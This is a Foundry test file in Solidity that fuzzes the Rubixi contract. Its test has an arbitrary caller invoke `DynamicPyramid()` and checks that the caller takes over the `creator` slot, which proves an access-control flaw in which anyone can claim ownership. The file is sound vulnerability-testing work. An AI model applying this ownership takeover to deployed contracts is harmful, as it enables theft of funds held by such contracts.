
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";
import {stdstorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestAccessControlRubixi is Test {
    using stdstorage for StdStorage;
    
    Rubixi public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        uint256 slot = stdstore
            .target(address(_contractUnderTest))
            .sig("creator()")
            .find();
        
        bytes32 initialCreator = vm.load(address(_contractUnderTest), bytes32(slot));
        
        vm.prank(caller);
        _contractUnderTest.DynamicPyramid();
        
        bytes32 newCreator = vm.load(address(_contractUnderTest), bytes32(slot));
        
        assertEq(address(bytes20(newCreator)), caller);
        assertTrue(address(bytes20(newCreator)) != address(bytes20(initialCreator)));
    }
}
